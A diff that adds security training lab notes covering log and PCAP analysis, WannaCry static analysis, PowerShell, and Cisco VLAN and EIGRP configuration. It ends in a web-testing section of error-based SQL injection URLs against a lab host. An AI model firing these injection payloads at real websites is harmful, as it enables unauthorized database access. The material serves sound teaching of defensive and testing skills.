@@ -1,0 +1,1559 @@
+#########################
+# Connect to the server #
+#########################
+ 
+Use Putty to SSH into my Ubuntu host in order to perform the lab tasks below.
+ 
+You can download Putty from here:
+http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+ 
+server ip:		45.63.116.164
+protocol:           	ssh
+port:               	22
+username:		ciscosecurity
+password: 				
+
+ 
+ 
+##############################################
+# Log Analysis with Linux command-line tools #
+##############################################
+The following command line executables are found in the Mac as well as most Linux Distributions.
+ 
+cat –  prints the content of a file in the terminal window
+grep – searches and filters based on patterns
+awk –  can sort each row into fields and display only what is needed
+sed –  performs find and replace functions
+sort – arranges output in an order
+uniq – compares adjacent lines and can report, filter or provide a count of duplicates
+ 
+ 
+##############
+# Cisco Logs #
+##############
+ 
+AWK Basics
+----------
+To quickly demonstrate the print feature in awk, we can instruct it to show only the 5th word of each line. Here we will print $5. Only the last 4 lines are being shown for brevity.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | awk '{print $5}' | tail -n 4
+-------------------------------------------------------------------------------
+ 
+ 
+ 
+Looking at a large file would still produce a large amount of output. A more useful thing to do might be to output every entry found in “$5”, group them together, count them, then sort them from the greatest to least number of occurrences. This can be done by piping the output through “sort“, using “uniq -c” to count the like entries, then using “sort -rn” to sort it in reverse order.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | awk '{print $5}'| sort | uniq -c | sort -rn
+-------------------------------------------------------------------------------
+ 
+ 
+ 
+While that’s sort of cool, it is obvious that we have some garbage in our output. Evidently we have a few lines that aren’t conforming to the output we expect to see in $5. We can insert grep to filter the file prior to feeding it to awk. This insures that we are at least looking at lines of text that contain “facility-level-mnemonic”.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | grep %[a-zA-Z]*-[0-9]-[a-zA-Z]* | awk '{print $5}' | sort | uniq -c | sort -rn
+-------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+Now that the output is cleaned up a bit, it is a good time to investigate some of the entries that appear most often. One way to see all occurrences is to use grep.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| awk '{print $10}' | sort | uniq -c | sort -rn
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10}' | sort | uniq -c | sort -rn
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10 " changed to " $14}' | sort | uniq -c | sort -rn
+--------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+################
+# The Scenario #
+################
+You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts).
+ 
+ 
+The fastest thing you can do is perform static analysis.
+ 
+ 
+ 
+###################
+# Static Analysis #
+###################
+ 
+- After logging please open a terminal window and type the following commands:
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+file wannacry.exe
+ 
+hexdump -n 2 -C wannacry.exe
+ 
+----------------------------------------------------------------------
+ 
+ 
+ 
+In a browser...go to: http://www.garykessler.net/library/file_sigs.html
+ 
+***What is '4d 5a' or 'MZ'***
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Ok, let's look for the individual strings
+ 
+ 
+---------------------------Type This-----------------------------------
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+----------------------------------------------------------------------
+
+
+
+
+##################################################################
+# Analyzing a PCAP Prads                                         #
+# Note: run as regular user                                      #
+##################################################################
+ 
+---------------------------Type this as a regular user----------------------------------
+cd /home/ciscosecurity/pcap_analysis
+ 
+prads -r suspicious-time.pcap -l prads-asset.log
+ 
+cat prads-asset.log | less
+ 
+cat prads-asset.log | grep SYN | grep -iE 'windows|linux'
+ 
+cat prads-asset.log | grep CLIENT | grep -iE 'safari|firefox|opera|chrome'
+ 
+cat prads-asset.log | grep SERVER | grep -iE 'apache|linux|ubuntu|nginx|iis'
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+##################################
+# PCAP Analysis with ChaosReader #
+# Note: run as regular user      #
+##################################
+---------------------------Type this as a regular user----------------------------------
+cd /home/ciscosecurity/pcap_analysis
+
+perl chaosreader.pl suspicious-time.pcap
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
+ 
+ 
+for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
+ 
+ 
+------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#############################
+# PCAP Analysis with tshark #
+# Note: run as regular user #
+#############################
+---------------------------Type this as a regular user---------------------------------
+cd /home/ciscosecurity/pcap_analysis
+ 
+tshark -i ens3 -r suspicious-time.pcap -qz io,phs
+ 
+tshark -r suspicious-time.pcap -qz ip_hosts,tree
+ 
+tshark -r suspicious-time.pcap -Y "http.request" -Tfields -e "ip.src" -e "http.user_agent" | uniq
+ 
+tshark -r suspicious-time.pcap -Y "dns" -T fields -e "ip.src" -e "dns.flags.response" -e "dns.qry.name"
+ 
+ 
+tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}'
+ 
+whois rapidshare.com.eyu32.ru
+ 
+whois sploitme.com.cn
+ 
+tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico' -e google -e 'honeynet.org'
+ 
+tshark -r suspicious-time.pcap -qz http_req,tree
+ 
+tshark -r suspicious-time.pcap -Y "data-text-lines contains \"<script\"" -T fields -e frame.number -e ip.src -e ip.dst
+ 
+tshark -r suspicious-time.pcap -Y http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico'  | grep 10.0.3.15 | sed -e 's/\?[^cse].*/\?\.\.\./g'
+------------------------------------------------------------------------
+
+
+
+#####################
+# Powershell Basics #
+#####################
+ 
+PowerShell is Microsoft's new scripting language that has been built in since the release Vista.
+ 
+PowerShell file extension end in .ps1 .
+ 
+An important note is that you cannot double click on a PowerShell script to execute it.
+ 
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+ 
+------------------------Type This------------------------------
+cd c:\
+dir
+cd
+ls
+---------------------------------------------------------------
+ 
+ 
+To obtain a list of cmdlets, use the Get-Command cmdlet
+------------------------Type This------------------------------
+Get-Command
+---------------------------------------------------------------
+ 
+ 
+You can use the Get-Alias cmdlet to see a full list of aliased commands.
+------------------------Type This------------------------------
+Get-Alias
+---------------------------------------------------------------
+ 
+ 
+Don't worry you won't blow up your machine with Powershell
+------------------------Type This------------------------------
+Get-Process | stop-process              Don't press [ ENTER ] What will this command do?
+Get-Process | stop-process -whatif
+---------------------------------------------------------------
+ 
+To get help with a cmdlet, use the Get-Help cmdlet along with the cmdlet you want information about.
+------------------------Type This------------------------------
+Get-Help Get-Command
+ 
+Get-Help Get-Service –online
+ 
+Get-Service -Name TermService, Spooler
+ 
+Get-Service –N BITS
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+- Run cmdlet through a pie and refer to its properties as $_
+------------------------Type This------------------------------
+Get-Service | where-object {  $_.Status -eq "Running"}
+---------------------------------------------------------------
+ 
+ 
+ 
+- PowerShell variables begin with the $ symbol. First lets create a variable
+------------------------Type This------------------------------
+$serv = Get-Service –N Spooler
+---------------------------------------------------------------
+ 
+To see the value of a variable you can just call it in the terminal.
+------------------------Type This------------------------------
+$serv
+ 
+$serv.gettype().fullname
+---------------------------------------------------------------
+ 
+ 
+Get-Member is another extremely useful cmdlet that will enumerate the available methods and properties of an object. You can pipe the object to Get-Member or pass it in
+------------------------Type This------------------------------
+$serv | Get-Member
+ 
+Get-Member -InputObject $serv
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+Let's use a method and a property with our object.
+------------------------Type This------------------------------
+$serv.Status
+$serv.Stop()
+$serv.Refresh()
+$serv.Status
+$serv.Start()
+$serv.Refresh()
+$serv.Status
+---------------------------------------------------------------
+ 
+ 
+If you want some good command-line shortcuts you can check out the following link:
+https://technet.microsoft.com/en-us/library/ff678293.aspx
+ 
+#############################
+# Simple Event Log Analysis #
+#############################
+Let's setup a directory to work in:
+------------------------Type This------------------------------
+cd c:\
+ 
+mkdir ps
+ 
+cd ps
+---------------------------------------------------------------
+ 
+Step 1: Dump the event logs
+---------------------------
+The first thing to do is to dump them into a format that facilitates later processing with Windows PowerShell.
+ 
+To dump the event log, you can use the Get-EventLog and the Exportto-Clixml cmdlets if you are working with a traditional event log such as the Security, Application, or System event logs.
+If you need to work with one of the trace logs, use the Get-WinEvent and the ExportTo-Clixml cmdlets.
+------------------------Type This------------------------------
+Get-EventLog -LogName application | Export-Clixml Applog.xml
+ 
+type .\Applog.xml
+ 
+$logs = "system","application","security"
+---------------------------------------------------------------
+ 
+ 
+The % symbol is an alias for the Foreach-Object cmdlet. It is often used when working interactively from the Windows PowerShell console
+------------------------Type This------------------------------
+$logs | % { get-eventlog -LogName $_ | Export-Clixml "$_.xml" }
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+Step 2: Import the event log of interest
+----------------------------------------
+To parse the event logs, use the Import-Clixml cmdlet to read the stored XML files.
+Store the results in a variable.
+Let's take a look at the commandlets Where-Object, Group-Object, and Select-Object.
+ 
+The following two commands first read the exported security log contents into a variable named $seclog, and then the five oldest entries are obtained.
+------------------------Type This------------------------------
+$seclog = Import-Clixml security.xml
+ 
+$seclog | select -Last 5
+---------------------------------------------------------------
+ 
+Cool trick from one of our students named Adam. This command allows you to look at the logs for the last 24 hours:
+------------------------Type This------------------------------
+Get-EventLog Application -After (Get-Date).AddDays(-1)
+---------------------------------------------------------------
+You can use '-after' and '-before' to filter date ranges
+ 
+One thing you must keep in mind is that once you export the security log to XML, it is no longer protected by anything more than the NFTS and share permissions that are assigned to the location where you store everything.
+By default, an ordinary user does not have permission to read the security log.
+ 
+ 
+ 
+ 
+Step 3: Drill into a specific entry
+-----------------------------------
+To view the entire contents of a specific event log entry, choose that entry, send the results to the Format-List cmdlet, and choose all of the properties.
+ 
+------------------------Type This------------------------------
+$seclog | select -first 1 | fl *
+---------------------------------------------------------------
+ 
+The message property contains the SID, account name, user domain, and privileges that are assigned for the new login.
+ 
+------------------------Type This------------------------------
+($seclog | select -first 1).message
+ 
+(($seclog | select -first 1).message).gettype()
+---------------------------------------------------------------
+ 
+ 
+In the *nix world you often want a count of something (wc -l).
+How often is the SeSecurityPrivilege privilege mentioned in the message property?
+To obtain this information, pipe the contents of the security log to a Where-Object to filter the events, and then send the results to the Measure-Object cmdlet to determine the number of events:
+------------------------Type This------------------------------
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | measure
+---------------------------------------------------------------
+If you want to ensure that only event log entries return that contain SeSecurityPrivilege in their text, use Group-Object to gather the matches by the EventID property.
+ 
+------------------------Type This------------------------------
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | group eventid
+---------------------------------------------------------------
+ 
+Because importing the event log into a variable from the stored XML results in a collection of event log entries, it means that the count property is also present.
+Use the count property to determine the total number of entries in the event log.
+------------------------Type This------------------------------
+$seclog.Count
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+############################
+# Simple Log File Analysis #
+############################
+ 
+ 
+You'll need to create the directory c:\ps and download sample iss log http://pastebin.com/raw.php?i=LBn64cyA
+ 
+------------------------Type This------------------------------
+cd c:\ps
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=ysnhXxTV", "c:\ps\CiscoLogFileExamples.txt")
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt
+---------------------------------------------------------------
+ 
+ 
+ 
+The Select-String cmdlet searches for text and text patterns in input strings and files. You can use it like Grep in UNIX and Findstr in Windows.
+------------------------Type This------------------------------
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line
+---------------------------------------------------------------
+ 
+ 
+ 
+To see how many connections are made when analyzing a single host, the output from that can be piped to another command: Measure-Object.
+------------------------Type This------------------------------
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line | Measure-Object
+---------------------------------------------------------------
+ 
+ 
+To select all IP addresses in the file expand the matches property, select the value, get unique values and measure the output.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique | Measure-Object
+---------------------------------------------------------------
+ 
+ 
+Removing Measure-Object shows all the individual IPs instead of just the count of the IP addresses. The Measure-Object command counts the IP addresses.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique
+---------------------------------------------------------------
+ 
+In order to determine which IP addresses have the most communication the last commands are removed to determine the value of the matches. Then the group command is issued on the piped output to group all the IP addresses (value), and then sort the objects by using the alias for Sort-Object: sort count –des.
+This sorts the IP addresses in a descending pattern as well as count and deliver the output to the shell.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select value | group value | sort count -des
+---------------------------------------------------------------
+
+
+
+#########################
+# Introduction to VLANs #
+#########################
+https://www.net-refresh.com/switching1.html
+ 
+ 
+1. Configure Host_Red1 to be an access port in VLAN 10
+2. Configure Host_Red2 to be an access port in VLAN 10
+3. Configure Host_Blue1 to be an access port in VLAN 20
+4. Configure Host_Blue2 to be an access port in VLAN 20
+ 
+ 
+-----Type these commands on switch 1----
+enable
+configure terminal
+    vlan 10
+      name Red_Vlan
+    interface f0/1
+      switchport mode access
+      switchport access vlan 10
+    interface f0/2
+      switchport mode access
+      switchport access vlan 10
+    interface f0/3
+      switchport mode access
+      switchport access vlan 20
+    interface f0/4
+      switchport mode access
+      switchport access vlan 20
+----------------------------------------
+ 
+Testing the configuration
+ 
+In order to test your configuration, try setting static IP addresses on the host PCs, and check which PCs can communicate. Set the host IP addresses to 192.168.0.1, 192.168.0.2, 192.168.0.3, and 192.168.0.4 respectively, with a subnet mask of 255.255.255.0. Note that having two VLANs using a single subnet is not something you will do in a real network, and is only done here to demonstrate the VLANs are separated.
+ 
+If you have configured the switch correctly you will find that the although the Red hosts can ping each other, they are unable to ping the Blue hosts.
+ 
+ 
+ 
+References used for this lab:
+* VLANs: https://www.net-refresh.com/articles/vlans1.html
+ 
+ 
+ 
+ 
+#######################
+# InterVlan Routing 1 #
+#######################
+https://www.net-refresh.com/switching2.html
+ 
+1. Assign 'Host_Red1' to vlan 10, and force to an access port.
+2. Assign 'Host_Red2' to vlan 10, and force to an access port.
+3. Assign 'Host_Blue1' to vlan 20, and force to an access port.
+4. Assign 'Host_Blue2' to vlan 20, and force to an access port.
+5. Assign Switch1 f0/10 to vlan 10, and force to an access port.
+6. Assign Switch1 f0/11 to vlan 20, and force to an access port.
+7. Set the IP address of Router1's f0/0 interface to the last usable address in the 10.0.0.0/24 subnet, and ensure the port is up.
+8. Set the IP address of Router1'a f0/1 interface to the last usable address in the 10.1.0.0/24 subnet, and ensure the port is up.
+9. On Switch1, create VLAN interface 10, and assign it the IP address 10.0.0.2/24.
+ 
+ 
+ 
+ 
+-----Type these commands on switch 1----
+enable
+configure terminal
+    vlan 10
+      name Red_Vlan
+    interface f0/1
+      switchport mode access
+      switchport access vlan 10
+    interface f0/2
+      switchport mode access
+      switchport access vlan 10
+    interface f0/10
+      switchport mode access
+      switchport access vlan 10
+    interface f0/3
+      switchport mode access
+      switchport access vlan 20
+    interface f0/4
+      switchport mode access
+      switchport access vlan 20
+    interface f0/11
+      switchport mode access
+      switchport access vlan 20
+    interface vlan 10
+      ip address 10.0.0.2 255.255.255.0
+ 
+----------------------------------------
+ 
+ 
+-----Type these commands on router 1----
+enable
+configure terminal
+   interface f0/0
+     ip address 10.0.0.254 255.255.255.0
+     no shutdown
+   interface f0/1
+     ip address 10.1.0.254 255.255.255.0
+     no shutdown
+     exit
+----------------------------------------
+ 
+ 
+Hopefully you completed that without too much difficulty! Each VLAN now has a port connected to the Router, so it should now be possible for a Red host to ping a Blue host. Go ahead and configure the host PCs with suitable IP addresses in their subnet. You will need to set the default gateway as well. Remember the default-gateway is the address that packets will be sent to if the host has no better route.
+ 
+ 
+ 
+References used for this lab:
+* VLANs: https://www.net-refresh.com/articles/vlans1.html
+* how to assign static IP on a switch: https://learningnetwork.cisco.com/thread/14861
+ 
+ 
+ 
+########################################################
+# Intervlan Routing using trunking (Router on a stick) #
+########################################################
+https://www.net-refresh.com/switching3.html
+ 
+1. Assign 'Host_Red1' to vlan 10, and force to an access port
+2. Assign 'Host_Red2' to vlan 10, and force to an access port
+3. Assign 'Host_Blue1' to vlan 20, and force to an access port
+4. Assign 'Host_Blue2' to vlan 20, and force to an access port
+5. Configure Switch1's f0/10 interface so it operates as a dot1q trunk
+6. Configure a sub-interface on Router1, f0/0.10. This sub-interface should receive frames with the dot1q tag 10.
+    Assign this the last usable IP address in the 10.0.0.32/27 subnet
+7. Configure a sub-interface on Router1, f0/0.20. This sub-interface should receive frames with the dot1q tag 20.
+    Assign this the last usable IP address in the 20.0.0.128/26 subnet
+8. On Switch1, create vlan interface 10, assign it the first usable IP address in the 10.0.0.32/27 subnet
+9. Configure the correct default gateway on Switch1
+ 
+ 
+ 
+-----Type these commands on switch 1----
+enable
+configure terminal
+    vlan 10
+      name Red_Vlan
+    interface f0/1
+      switchport mode access
+      switchport access vlan 10
+    interface f0/2
+      switchport mode access
+      switchport access vlan 10
+    interface f0/3
+      switchport mode access
+      switchport access vlan 20
+    interface f0/4
+      switchport mode access
+      switchport access vlan 20
+    interface f0/10
+      switchport mode trunk
+    interface f0/11
+      switchport mode access
+      switchport access vlan 20
+    interface vlan 10
+      ip address 10.0.0.33 255.255.255.224
+	  exit
+    ip default-gateway 10.0.0.62
+ 
+----------------------------------------
+ 
+ 
+-----Type these commands on router 1----
+enable
+configure terminal
+   interface f0/0
+     no shutdown
+   interface f0/0.10
+     encapsulation dot1q 10
+     ip address 10.0.0.62 255.255.255.224
+     no shutdown
+   interface f0/0.20
+     encapsulation dot1q 20
+     ip address 20.0.0.190 255.255.255.192
+     no shutdown
+     exit
+----------------------------------------
+ 
+ 
+ 
+References used for this lab:
+* VLANs: https://www.net-refresh.com/articles/vlans1.html
+* how to assign static IP on a switch: https://learningnetwork.cisco.com/thread/14861
+* Trunk port: https://networklessons.com/switching/how-to-configure-trunk-on-cisco-catalyst-switch
+* Subinterface: https://learningnetwork.cisco.com/thread/14587
+* last useable IP: https://www.aelius.com/njh/subnet_sheet.html
+* default gateway on a switch: https://learningnetwork.cisco.com/thread/22283
+ 
+ 
+ 
+##############################################
+# Interswitch trunks with Inter-Vlan routing #
+##############################################
+https://www.net-refresh.com/switching4.html
+ 
+ 
+1. Configure Switch1's f0/10 interface so it operates as a trunk
+2. Configure Switch1's f0/11 interface so it dynamically negotiates and operates as a dot1q trunk
+3. Configure Switch2's f0/11 interface so it dynamically negotiates and operates as a dot1q trunk
+4. Assign 'Host_Red1' to vlan 10, and force to an access port
+5. Assign 'Host_Red2' to vlan 10, and force to an access port
+6. Assign 'Host_Blue1' to vlan 20, and force to an access port
+7. Assign 'Host_Blue2' to vlan 20, and force to an access port
+8. Create a sub-interface on Router1, f0/0.10. This sub-interface should receive frames with dot1q tag 10. Assign this the last usable IP address in the 172.16.0.0/22 subnet
+9. Create a sub-interface on Router1, f0/0.20. This sub-interface should receive frames with dot1q tag 20. Assign this the last usable IP address in the 172.16.4.0/26 subnet.
+10. On Switch1, create vlan interface 10, and assign it the first usable address in the 172.16.0.0/22 subnet
+11. Configure the correct default gateway on Switch1
+ 
+ 
+-----Type these commands on switch 1----
+enable
+configure terminal
+    interface f0/10
+      switchport mode trunk
+      switchport trunk encapsulation dot1q
+    vlan 10
+      name Red_Vlan
+    interface f0/1
+      switchport mode access
+      switchport access vlan 10
+    interface f0/2
+      switchport mode access
+      switchport access vlan 10
+    vlan 20
+      name Blue_Vlan
+    interface f0/3
+      switchport mode access
+      switchport access vlan 20
+    interface f0/4
+      switchport mode access
+      switchport access vlan 20
+    interface vlan 10
+      ip address 172.16.0.1 255.255.252.0
+----------------------------------------
+ 
+ 
+-----Type these commands on switch 2----
+enable
+configure terminal
+    interface f0/11
+      switchport mode trunk
+      switchport trunk encapsulation dot1q
+----------------------------------------
+ 
+ 
+-----Type these commands on router 1----
+enable
+configure terminal
+   interface f0/0
+     no shutdown
+   interface f0/0.10
+     encapsulation dot1q 10
+     ip address 172.16.3.254 255.255.252.0
+     no shutdown
+   interface f0/0.20
+     encapsulation dot1q 20
+     ip address 172.16.4.62 255.255.255.192
+     no shutdown
+     exit
+----------------------------------------
+ 
+ 
+ 
+References used for this lab:
+* VLANs: https://www.net-refresh.com/articles/vlans1.html
+* how to assign static IP on a switch: https://learningnetwork.cisco.com/thread/14861
+* Trunk port: https://networklessons.com/switching/how-to-configure-trunk-on-cisco-catalyst-switch
+* Subinterface: https://learningnetwork.cisco.com/thread/14587
+* last useable IP: https://www.aelius.com/njh/subnet_sheet.html
+* default gateway on a switch: https://learningnetwork.cisco.com/thread/22283
+ 
+ 
+ 
+ 
+#############################################
+# Configuring Static Routes between Routers #
+#############################################
+https://www.net-refresh.com/routing1.html
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+##################################################
+# Configuring the EIGRP dynamic routing protocol #
+##################################################
+https://www.net-refresh.com/routing3.html
+ 
+1. On Router1 configure the following interfaces with IP addresses:
+? f0/0 with IP address 10.0.0.1/24
+? s0/0 with IP address 1.0.0.1/30
+? s0/1 with IP address 2.0.0.1/30
+ 
+-----Type these commands on router 1----
+enable
+configure terminal
+   interface f0/0
+     ip address 10.0.0.1 255.255.255.0
+     no shutdown
+   interface s0/0
+     ip address 1.0.0.1 255.255.255.252
+     no shutdown
+   interface s0/1
+     ip address 2.0.0.1 255.255.255.252
+     no shutdown
+----------------------------------------
+ 
+ 
+2. On Router2 configure the following interfaces with IP addresses:
+? f0/0 with IP address 20.0.0.1/24
+? f0/1 with IP address 4.0.0.1/30
+? s0/0 with IP address 1.0.0.2/30
+? s0/1 with IP address 3.0.0.1/30
+ 
+-----Type these commands on router 2----
+enable
+configure terminal
+   interface f0/0
+     ip address 20.0.0.1 255.255.255.0
+     no shutdown
+   interface f0/1
+     ip address 4.0.0.1 255.255.255.252
+     no shutdown
+   interface s0/0
+     ip address 1.0.0.2 255.255.255.252
+     no shutdown
+   interface s0/1
+     ip address 3.0.0.1 255.255.255.252
+     no shutdown
+----------------------------------------
+ 
+3. On Router3 configure the following interfaces with IP addresses:
+? f0/0 with IP address 30.0.0.1/24
+? s0/0 with IP address 3.0.0.2/30
+? s0/1 with IP address 2.0.0.2/30
+ 
+ 
+-----Type these commands on router 3----
+enable
+configure terminal
+   interface f0/0
+     ip address 30.0.0.1 255.255.255.0
+     no shutdown
+   interface s0/0
+     ip address 3.0.0.2 255.255.255.252
+     no shutdown
+   interface s0/1
+     ip address 2.0.0.2 255.255.255.252
+     no shutdown
+----------------------------------------
+ 
+4. On Router4 configure the following interfaces with IP addresses:
+? f0/0 with IP address 40.0.0.1/24
+? f0/1 with IP address 4.0.0.2/30
+ 
+ 
+-----Type these commands on router 4----
+enable
+configure terminal
+   interface f0/0
+     ip address 40.0.0.1 255.255.255.0
+     no shutdown
+   interface f0/1
+     ip address 4.0.0.2 255.255.255.252
+     no shutdown
+----------------------------------------
+ 
+5. On Router1 configure EIGRP to achieve the following requirements:
+? Autonomous system 10
+? Auto route summarization disabled
+? All attached networks should be advertised
+? No EIGRP routing updates should be sent towards Host1
+ 
+-----Type these commands on router 1----
+enable
+configure terminal
+   router eigrp 10
+     no auto-summary
+     network 1.0.0.0 0.0.0.3
+     network 2.0.0.0 0.0.0.3
+     exit
+----------------------------------------
+ 
+ 
+6. On Router2 configure EIGRP to achieve the following requirements:
+ ?Autonomous system 10
+? Auto route summarization disabled
+? All attached networks should be advertised
+? No EIGRP routing updates should be sent towards Host2
+ 
+-----Type these commands on router 2----
+enable
+configure terminal
+   router eigrp 10
+     no auto-summary
+     network 4.0.0.0 0.0.0.3
+     network 1.0.0.0 0.0.0.3
+     network 3.0.0.0 0.0.0.3
+     exit
+----------------------------------------
+ 
+7. On Router3 configure EIGRP to achieve the following requirements:
+?Autonomous system 10
+? Auto route summarization disabled
+? All attached networks should be advertised
+? No EIGRP routing updates should be sent towards Host3
+ 
+-----Type these commands on router 1----
+enable
+configure terminal
+   router eigrp 10
+     no auto-summary
+     network 3.0.0.0 0.0.0.3
+     network 2.0.0.0 0.0.0.3
+     exit
+----------------------------------------
+ 
+8. On Router4 configure EIGRP to achieve the following requirements:
+?Autonomous system 10
+? Auto route summarization disabled
+? All attached networks should be advertised
+? No EIGRP routing updates should be sent towards Host4
+ 
+-----Type these commands on router 1----
+enable
+configure terminal
+   router eigrp 10
+     no auto-summary
+     network 4.0.0.0 0.0.0.3
+     exit
+----------------------------------------
+
+
+
+##################################
+# Basic: Web Application Testing #
+##################################
+ 
+Most people are going to tell you reference the OWASP Testing guide.
+https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
+ 
+I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.
+ 
+ 
+The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
+   
+    1. Does the website talk to a DB?
+        - Look for parameter passing (ex: site.com/page.php?id=4)
+        - If yes - try SQL Injection
+ 
+    2. Can I or someone else see what I type?
+        - If yes - try XSS
+ 
+    3. Does the page reference a file?
+        - If yes - try LFI/RFI
+ 
+Let's start with some manual testing against 45.77.162.239
+ 
+ 
+Start here:
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/
+-----------------------------------------------------------------------
+ 
+Let's try throwing a single quote (') in there:
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2'
+-------------------------------------------------------------------------------------
+ 
+I get the following error:
+ 
+Unclosed quotation mark after the character string ''.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+ 
+Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#########################################################################################
+# SQL Injection                                                                         #
+# https://s3.amazonaws.com/infosecaddictsfiles/1-Intro_To_SQL_Intection.pptx            #
+#########################################################################################
+ 
+ 
+- Another quick way to test for SQLI is to remove the parameter value
+ 
+ 
+#############################
+# Error-Based SQL Injection #
+#############################
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
